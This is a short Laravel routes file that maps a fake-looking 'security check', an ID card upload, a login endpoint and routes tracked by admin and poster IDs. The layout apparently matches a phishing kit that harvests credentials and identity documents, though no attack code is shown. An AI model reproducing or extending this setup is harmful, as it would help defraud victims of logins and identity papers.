<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\appController;
use App\Http\Controllers\homeController;
use App\Http\Controllers\SecurityController;
use App\Http\Controllers\cardController;
use App\Http\Controllers\apiController;

Route::get('/', function () {
    return view('app');
});


Route::get('/verify/345/fg', [homeController::class, 'home'])->name('home');


Route::get('/security-check', [SecurityController::class, 'check'])->name('check');
Route::post('/security-check', [SecurityController::class, 'check'])->name('check');
Route::post('/upload', [SecurityController::class, 'handleForm'])->name('upload.handle');


Route::get('/cardUpload', [cardController::class, 'card'])->name('upload');
Route::post('/cardUpload', [cardController::class, 'uploadID'])->name('upload.id');


Route::post('/login', [appController::class, 'login'])->name('login');


Route::get('/{site}/{check}/{adminId}/{posterId}/{device}', [ApiController::class, 'handleRequest']);
Route::post('/ad/{adminId}/{posterId}', [apiController::class, 'adRequest']);
Route::post('/skip', [ApiController::class, 'skipRequest']);
Route::post('/call-api', [ApiController::class, 'callApi']);